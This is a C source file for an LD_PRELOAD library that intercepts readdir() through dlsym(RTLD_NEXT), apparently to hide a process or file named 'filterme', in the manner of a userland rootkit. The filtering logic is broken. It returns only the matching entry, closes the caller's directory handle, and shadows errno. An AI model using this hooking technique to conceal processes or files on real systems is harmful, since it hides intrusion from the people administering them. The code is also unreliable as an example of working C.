#define _GNU_SOURCE

#include <stdio.h>
#include <dlfcn.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <dirent.h>

static const char* filter_proc = "filterme";

#define DECLARE_READDIR(dirent, readdir)
static struct dirent* (*original_readdir)(DIR*) = NULL;

struct dirent* readdir(DIR *dirp) {
    struct dirent *dp;
    //dirp = opendir(".");

    if(original_readdir == NULL) {
        original_readdir = dlsym(RTLD_NEXT, "readdir");

        if(original_readdir == NULL) {
            fprintf(stderr, "error in dlsym: %s\n", dlerror());
        }
    }
    

    while(1) {
        int errno = 0;

        if((dp = original_readdir(dirp)) != NULL) {
            if(strcmp(dp->d_name, filter_proc) == 0) {
                closedir(dirp);
                return dp;
            }
        } else {
            closedir(dirp);
            return dp;
        }
    }
    closedir(dirp);
    return dp;
}
